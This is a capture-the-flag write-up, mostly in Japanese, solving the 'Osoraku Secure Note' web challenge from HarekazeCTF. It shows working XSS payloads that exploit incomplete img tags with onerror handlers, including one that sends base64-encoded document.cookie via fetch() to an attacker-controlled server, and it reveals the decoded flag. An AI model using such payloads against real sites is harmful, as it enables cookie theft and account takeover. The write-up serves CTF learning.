# Osoraku Secure Note:Web:322pts
メモ帳を作ってみました。  
[http://osoraku-secure-note.harekaze.com](http://osoraku-secure-note.harekaze.com/)  
添付ファイル:  
- [osoraku-secure-note.zip](osoraku-secure-note.zip)  

---

I made a note-taking service.  
[http://osoraku-secure-note.harekaze.com](http://osoraku-secure-note.harekaze.com/)  
Attachments:  
- [osoraku-secure-note.zip](osoraku-secure-note.zip)  

# Solution
サイトにアクセスするとメモサービスのようだ。  
Osoraku Secure Note  
[site1.png](site/site1.png)  
メモの閲覧画面で`Report this note`とあることからもXSS問題のようだ。  
[site2.png](site/site2.png)  
`<script>alert(1)</script>`はブロックされる。  
ブラックボックスで`<img abc`を入れてみると`<img abc="" <="" div="">`となっていた。  
不完全なタグでXSSが起こせそうだ。  
`<img src="1" onerror="alert(1)"`でalertが発生した。  
XSSが達成できたので、次に配布されたクローラのソースを見ると以下のようであった。  
```js
~~~
  const page = await browser.newPage();
  try {
    await page.setCookie({
      name: 'flag',
      value: FLAG,
      domain: new URL(BASE_URL).hostname,
      httpOnly: false,
      secure: false
    });
~~~
```
setCookieしているので、document.cookieを取得してリダイレクトすればよい。  
`<img src="1" onerror="location.href='https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie)"`  
しかし、うまく動作しなかった(ローカルではChrome,Firefoxで動作した)。  
クローラではよくあることなので、別手法としてfetchすればよい。  
`<img src="1" onerror="fetch('https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie))"`  
すると`/?s=ZmxhZz1IYXJla2F6ZUNURntjaHIxc3RtNHNfNGx3NHlzX3JlbTFuZHNfbWVfMGZfNG00ZzRtMX0=`のリクエストが飛んでくる。  
```bash
$ echo "ZmxhZz1IYXJla2F6ZUNURntjaHIxc3RtNHNfNGx3NHlzX3JlbTFuZHNfbWVfMGZfNG00ZzRtMX0=" | base64 -d
flag=HarekazeCTF{chr1stm4s_4lw4ys_rem1nds_me_0f_4m4g4m1}
```
デコードするとflagであった。  
ちなみにfirst bloodだった。  

## HarekazeCTF{chr1stm4s_4lw4ys_rem1nds_me_0f_4m4g4m1}